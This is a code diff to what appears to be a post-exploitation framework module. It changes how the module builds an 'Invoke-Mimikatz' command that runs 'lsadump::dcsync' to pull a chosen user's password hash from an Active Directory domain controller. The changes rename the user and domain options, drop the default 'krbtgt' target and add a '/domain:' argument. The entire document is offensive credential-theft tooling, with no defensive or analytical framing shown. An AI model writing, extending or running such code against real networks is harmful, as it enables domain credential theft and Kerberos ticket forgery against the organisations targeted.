@@ -40,13 +40,13 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'Username' : {
-                'Description'   :   'Username to extract the hash for.',
+            'user' : {
+                'Description'   :   'Username to extract the hash for (domain\username format).',
                 'Required'      :   True,
-                'Value'         :   'krbtgt'
+                'Value'         :   ''
             },
-            'Domain' : {
-                'Description'   :   'Specified (fqdn) domain to pull for the primary DC.',
+            'domain' : {
+                'Description'   :   'Specified (fqdn) domain to pull for the primary domain/DC.',
                 'Required'      :   False,
                 'Value'         :   ''
             }
@@ -81,7 +81,10 @@ class Module:
 
         script += "Invoke-Mimikatz -Command "
 
-        script += "'\"lsadump::dcsync /user:" + self.options['Username']['Value']
+        script += "'\"lsadump::dcsync /user:" + self.options['user']['Value']
+
+        if self.options["domain"]['Value'] != "":
+            script += " /domain:" + self.options['domain']['Value']
 
         script += "\"';"
 
